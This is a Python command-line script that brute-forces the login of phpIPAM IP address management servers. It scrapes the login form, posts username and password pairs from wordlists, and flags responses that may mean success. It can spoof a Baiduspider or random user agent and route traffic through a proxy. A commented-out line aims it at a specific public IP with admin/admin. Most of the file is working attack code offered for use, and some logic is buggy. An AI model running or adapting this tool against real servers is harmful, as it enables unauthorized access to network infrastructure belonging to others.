import argparse
from user_agent import get_user_agent_pc
import requests
import os
import re
from pyquery import PyQuery as pq
from random import randint

requests.packages.urllib3.disable_warnings()
proxy_url = "http://127.0.0.1:10809"
process_login_path = "/app/login/login_check.php"
proxies = None
headers = None
timeout = None
delay = None
thread = None
invalid_pattern = re.compile("<div.*?>(.*?)</div>", re.I)


def get_login_path(url: str) -> tuple:
    global proxies, headers, timeout
    try:
        res = requests.get(url=url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
        login_path = res.url
        return 200, login_path
    except Exception as e:
        return 500, "访问{}时发生错误".format(url)


def get_login_content(url: str, charset: str = "utf-8") -> tuple:
    global proxies, headers, timeout
    try:
        res = requests.get(url=url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
        encoding = res.encoding
        if encoding is None or not encoding:
            encoding = charset
        content = res.content.decode(encoding)
        return 200, content
    except Exception as e:
        return 500, "访问{}时发生错误".format(url)


def get_login_form(content: str) -> dict:
    post_data = dict()
    doc = pq(content)
    form_box = doc('form')
    input_box = form_box.find("input")
    for o in input_box:
        name = o.name
        if name is None or not name:
            continue
        post_data.setdefault(name, "")
    return post_data


def brute_login(url: str, data_form: dict, data_dict: dict):
    global process_login_path
    if url.endswith('/'):
        url = url[:-1]

    poc_url = url + process_login_path
    username_list = data_dict.get('username', None)
    password_list = data_dict.get('password', None)

    for username in username_list:
        for password in password_list:
            data_form['ipamusername'] = username
            data_form['ipampassword'] = password
            process_login(poc_url, data_form)


def process_login(url: str, data: dict):
    global proxies, headers, timeout
    try:
        res = requests.post(url=url, data=data, headers=headers, timeout=timeout, proxies=proxies)
        encoding = res.encoding
        content = res.content.decode(encoding)
        res_groups = invalid_pattern.findall(content)
        if res_groups is None or not res_groups:
            print("url:{}; data={} maybe success".format(url, data))
        else:
            res = res_groups[0]
            print("url:{}; data={}; status:".format(url, data), res)
    except Exception as e:
        print("访问{}过程中出现错误".format(url))


def get_data_from_file(filename: str, mode: str) -> tuple:
    if not os.path.isabs(filename):
        filename = os.path.abspath(os.path.join(os.getcwd(), filename))
    if not os.path.isfile(filename):
        return "405", "{}不是一个合法文件".format(filename)
    if not os.path.exists(filename):
        return "404", "无法找到{}文件".format(filename)
    try:
        content = None
        with open(filename, mode=mode) as f:
            content = f.read().split()
        return "200", content
    except Exception as e:
        return "500", "打开{}文件时发生意料之外的错误".format(filename)


def get_data_brute_list(url_dict: dict) -> dict:
    brute_list = {
        'url': None,
        'username': None,
        'password': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != "200":
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]

    return brute_list


def task(url_dict: dict) -> None:
    global proxies, headers, timeout, delay, thread

    brute_list = get_data_brute_list(url_dict)

    urls = brute_list.get('url', None)
    username_password_dict = {
        'username': brute_list.get('username', None),
        'password': brute_list.get('password', None),
    }

    options = brute_list.get('options', None)[0]
    proxy = options.get('proxy', None)
    if proxy is None or not proxy:
        proxy = None
    else:
        os.environ['http_proxy'] = proxy

    proxies = {
        'http': proxy
    }

    headers = {
        "User-Agent": options.get('user_agent', None)
    }

    timeout = options.get('time_out', None)
    delay = options.get('delay', None)
    thread = options.get('thread', None)

    for url in urls:
        code, mes = get_login_path(url)
        if code != 200:
            print(mes)
            continue

        login_path = mes
        code, mes = get_login_content(login_path)
        if code != 200:
            print(mes)
            continue

        content = mes
        data_format = get_login_form(content)

        brute_login(url, data_format, username_password_dict)
    # process_login("http://62.141.37.170/app/login/login_check.php", data={'ipamusername': 'admin', 'ipampassword': 'admin'})


def set_cmd_arg() -> any:
    description = 'PHPipam Open Source IP Address Management System Weak Password Vulnerability.'

    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    username = parser.add_mutually_exclusive_group(required=True)
    username.add_argument('-u', '--username', type=str, help='Enter username')
    username.add_argument('-U', '--username-list', type=str, help='Enter the file path containing the username')

    password = parser.add_mutually_exclusive_group(required=True)
    password.add_argument('-p', '--password', type=str, help='Enter password')
    password.add_argument('-P', '--password-list', type=str, help='Enter the file path containing the password')

    parser.add_argument('--random-agent', type=bool,
                        required=False, help='Using random user agents')
    parser.add_argument('--time-out', type=int,
                        required=False, help='Set the HTTP access timeout range (setting range from 0 to 5)')
    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str,
                        required=False, help='Set up HTTP proxy')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    if args.username is None or not args.username:
        o.setdefault('username', {'type': 'file', 'value': args.username_list})
    else:
        o.setdefault('username', {'type': 'str', 'value': args.username})

    if args.password is None or not args.password:
        o.setdefault('password', {'type': 'file', 'value': args.password_list})
    else:
        o.setdefault('password', {'type': 'str', 'value': args.password})

    options = dict()
    if args.random_agent is not None and  args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
    options.setdefault('user_agent', user_agent)

    time_out = 1
    base_time_out = randint(1, 5)
    if args.time_out is not None:
        if args.time_out < 0 or args.time_out > 5:
            time_out = 0
        else:
            time_out = args.time_out
    options.setdefault('time_out', (base_time_out, base_time_out + time_out))

    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 0)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)

    o.setdefault('options', {"type": "str", "value": options})

    return o


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    task(obj)


if __name__ == '__main__':
    main()
